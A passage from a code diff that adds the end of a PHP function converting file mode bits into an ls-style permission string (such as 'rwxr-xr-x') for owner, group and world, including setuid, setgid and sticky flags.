+} elseif (($statusnya & 0x2000) == 0x2000) {
+// Character special
+$ingfo = 'c';
+} elseif (($statusnya & 0x1000) == 0x1000) {
+// FIFO pipe
+$ingfo = 'p';
+} else {
+// Unknown
+$ingfo = 'u';
+}
+
+// Owner
+$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
+$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
+$ingfo .= (($statusnya & 0x0040) ?
+(($statusnya & 0x0800) ? 's' : 'x' ) :
+(($statusnya & 0x0800) ? 'S' : '-'));
+
+
+// Group
+$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
+$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
+$ingfo .= (($statusnya & 0x0008) ?
+(($statusnya & 0x0400) ? 's' : 'x' ) :
+(($statusnya & 0x0400) ? 'S' : '-'));
+
+// World
+$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
+$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
+
+$ingfo .= (($statusnya & 0x0001) ?
+(($statusnya & 0x0200) ? 't' : 'x' ) :
+(($statusnya & 0x0200) ? 'T' : '-'));
+
+return $ingfo;
+}
+?>
